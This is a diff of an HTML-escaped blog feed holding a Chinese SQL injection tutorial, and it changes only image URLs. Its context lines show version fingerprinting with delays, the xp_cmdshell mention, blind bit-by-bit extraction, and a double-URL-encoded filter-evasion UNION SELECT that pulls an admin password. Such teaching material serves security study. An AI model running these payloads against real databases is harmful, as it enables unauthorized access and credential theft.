 &lt;h5 id=&#34;mssql&#34;&gt;&lt;a href=&#34;#mssql&#34; class=&#34;headerlink&#34; title=&#34;mssql&#34;&gt;&lt;/a&gt;mssql&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
 Microsoft &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server &lt;span class=&#34;token number&#34;&gt;2005&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9.00&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.3042&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.00&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Intel X86&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
@@ -1585,7 +1585,7 @@ Standard Edition &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; Windo
 &lt;span class=&#34;token comment&#34;&gt;-- 截取@@version的第25个字符是否为5，为5就是2005数据库，并且延迟返回&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;跑个脚本能把这一整段跑出来，精确判断，判断补丁，利用补丁攻击&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJWqk4.png&#34; alt=&#34;WJWqk4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/611e433cc3ffdeba5e68dcaaa0a90f0d.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.sqlteam.com/articles/sql-server-versions&#34;&gt;SQL Server Version - SQLTeam.com&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;如果有管理员权限，可以使用xp_cmdshell扩展储存过程来产生延迟，它通过加载一条需要花费特定秒数的命令来实现。&lt;/p&gt;
 &lt;p&gt;启用xp_cmdshell&lt;/p&gt;
@@ -2306,7 +2306,7 @@ pg_sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span cla
 &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Mad&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Bob&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;我们可以看到，在其中注入了子查询，当然我们可以换成其他的漏洞代码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ4jpj.png&#34; alt=&#34;WJ4jpj.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/1635b29c12fca4d4f03c3fa7f6557976.png&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;常见的SQL盲注场景&#34;&gt;&lt;a href=&#34;#常见的SQL盲注场景&#34; class=&#34;headerlink&#34; title=&#34;常见的SQL盲注场景&#34;&gt;&lt;/a&gt;常见的SQL盲注场景&lt;/h4&gt;&lt;p&gt;1） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容可被适度控制的页面。这种情况通常出现在根据用户选择来显示信息的页面中。例如，用户点击一个包含id参数（能唯一识别数据库中的商品）的链接或者提交一个搜索请求。对于这两种情况，用户可控制页面提供的输出，因为该页面是根据用户提供的信息来生成的，比如提供一个产品的id，该页面还包含了从响应中获得的数据。&lt;/p&gt;
 &lt;p&gt;因为页面提供了反馈信息（虽然不是以详细的数据库错误消息方式），所以可以使用基于时间的确认漏洞以及能够修改页面显示数据集的漏洞。例如，某个攻击可能会显示香皂或刷子的产品描述，以指示是否提取到了 0-bit或1-bit的数据。大多数情况下，只需提交一个单引号就足以破坏SQL查询平衡并强制产生一个通用的错误页面，这将有助于推断是否存在SQL注入漏洞。&lt;/p&gt;
 &lt;p&gt;2） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容不可控的页面。当页面包含多个SQL查询，但只有第一个查询容易受到攻击且不产生输出时会碰到这种情况。还有一种场景也会引发这种情况：SQL注入位于 UPDATE或INSERT语句中，此时提交的信息虽然被写入数据库中且不产生输出，但却会产生通用的错误。&lt;/p&gt;
@@ -2350,7 +2350,7 @@ Incubating&lt;span class=&#34;token string&#34;&gt;&#39; and SUBSTRING (&#39;&lt
 (&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;/li&gt;
 &lt;li&gt;&lt;p&gt;逐位方法&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ5E9J.png&#34; alt=&#34;WJ5E9J.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/304ab8debee5bb56e02a5703f7ad7fba.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;对每位（bit）进行比对&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Incubating&lt;span class=&#34;token string&#34;&gt;&#39;
 AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp;amp;
@@ -3165,8 +3165,8 @@ stristr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span cla
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/tblUsers%252f%252a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/&#39;&lt;/span&gt;admin&#39;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;也能使用Unicode编码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ5T29.png&#34; alt=&#34;WJ5T29.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ5v5D.png&#34; alt=&#34;WJ5v5D.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/ada02281ca6c2ec5917209ee31ddf0fe.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/53fabfd7b23b29dcc9b7671b125d1d16.png&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;使用动态查询执行&#34;&gt;&lt;a href=&#34;#使用动态查询执行&#34; class=&#34;headerlink&#34; title=&#34;使用动态查询执行&#34;&gt;&lt;/a&gt;使用动态查询执行&lt;/h4&gt;&lt;p&gt;过滤器阻止了想注入的查询，那么可以使用动态执行来避开该过滤器。&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;p&gt;mssql&lt;/p&gt;
@@ -5978,25 +5978,25 @@ my $sqlstr =$subvar[0];
 &lt;li&gt;&lt;p&gt;concat&lt;/p&gt;
 &lt;p&gt;支付串和支付串连接，数字和字符串连接，数字和数字连接&lt;/p&gt;
 &lt;p&gt;用法：&lt;code&gt;concat(string1,string2,……)&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/06/01/2KQ7Yn.png&#34; alt=&#34;2KQ7Yn.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/3a856f263eb6da6ab3bed779e32e0173.png&#34;&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;&lt;p&gt;concat_ws&lt;/p&gt;
 &lt;p&gt;其实和concat一个意思&lt;/p&gt;
 &lt;p&gt;用法：&lt;code&gt;concat_ws(分隔符,string1,string2,……)&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/06/01/2KQxw4.png&#34; alt=&#34;2KQxw4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/90bc37652386ffbd8f0580a3d8bbef91.png&#34;&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id=&#34;空格连接&#34;&gt;&lt;a href=&#34;#空格连接&#34; class=&#34;headerlink&#34; title=&#34;空格连接&#34;&gt;&lt;/a&gt;空格连接&lt;/h3&gt;&lt;p&gt;如图连接方式，字符串和字符串，其他都不行&lt;/p&gt;
 &lt;p&gt;函数不能以空格连接任意数据类型，在其他函数中可以使用&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/06/01/2KlVmD.png&#34; alt=&#34;2KlVmD.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/06/01/2Kll1P.png&#34; alt=&#34;2Kll1P.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/a95410f44d0ae31ea98c31f23bc20715.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/45f5f8b8e15b7e9ce016c4ab5ff0d1b5.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;函数可以&lt;/p&gt;
-&lt;h3 id=&#34;实际分析&#34;&gt;&lt;a href=&#34;#实际分析&#34; class=&#34;headerlink&#34; title=&#34;实际分析&#34;&gt;&lt;/a&gt;实际分析&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/06/01/2KlNkj.png&#34; alt=&#34;2KlNkj.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;实际分析&#34;&gt;&lt;a href=&#34;#实际分析&#34; class=&#34;headerlink&#34; title=&#34;实际分析&#34;&gt;&lt;/a&gt;实际分析&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/7273d14e7c905925e9c02030a7136613.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;可以看到函数在单引号和双引号中都执行不了，以字符串形式返回&lt;/p&gt;
 &lt;h3 id=&#34;拓展&#34;&gt;&lt;a href=&#34;#拓展&#34; class=&#34;headerlink&#34; title=&#34;拓展&#34;&gt;&lt;/a&gt;拓展&lt;/h3&gt;&lt;p&gt;&lt;code&gt;group_concat&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;用法：&lt;code&gt;group_concat(列名，分隔符)&lt;/code&gt;分隔符可选，为空则为逗号&lt;/p&gt;
 &lt;p&gt;作用：将一列所有的值打印出来&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/06/01/2KlsnU.png&#34; alt=&#34;2KlsnU.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/043626be3a8a64fb3d8628ecf8617e12.png&#34;&gt;&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
